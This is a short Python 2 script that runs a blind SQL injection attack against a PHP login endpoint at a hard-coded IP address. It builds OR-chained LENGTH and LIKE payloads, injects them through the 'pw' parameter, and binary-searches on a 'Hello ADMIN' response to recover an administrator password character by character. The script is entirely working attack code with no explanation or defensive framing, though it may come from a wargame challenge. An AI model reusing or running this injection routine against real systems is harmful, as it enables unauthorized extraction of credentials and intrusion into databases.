def get_length_pay(min_,max_):
	pay = str()
	pay_gadget = " || (select LENGTH(pw)=%d)"
	for i in range(min_,(min_+max_)/2):
		pay += pay_gadget%i
	return pay

def get_pay(min_,max_, pw):
	pay = str()
	pay_gadget = " || (select pw like \"%s%%\") "
	for i in range(min_,(min_+max_)/2):
		pay += pay_gadget % (pw + chr(i))
	return pay
	
import requests
import time

start_time = time.time() 
url = "http://108.61.161.168/blind.php?pw="
query_count = 0

min_ = 0
max_ = 100
while True:
	if (max_ - min_)<=1:
		length = min_
		break
	query = '%27' + get_length_pay(min_,max_) + "-- -"
	a = requests.get(url+query)
	query_count +=1
	if a.text.find("Hello ADMIN") > -1:
		max_ = (min_+max_)/2 
	else:
		min_ = (min_+max_)/2 

print "[+]Length : %d" % length
pw = str()
for i in range(0,length):
	min_=48
	max_=122
	while True:
		if (max_ - min_) <=1:
			pw += chr(min_)
			break
		query = '%27' + get_pay(min_,max_,pw) + "-- -"
		a = requests.get(url+query)
		query_count +=1
		if a.text.find("Hello ADMIN") > -1:
			max_ = (min_+max_)/2 
		else:
			min_ = (min_+max_)/2

print "\n\n\n---------------------\n[+]PW : %s\n[+]Second : %s\n[+]Query_count : %d\n---------------------\n\n\n" % (pw,(time.time() - start_time),query_count)

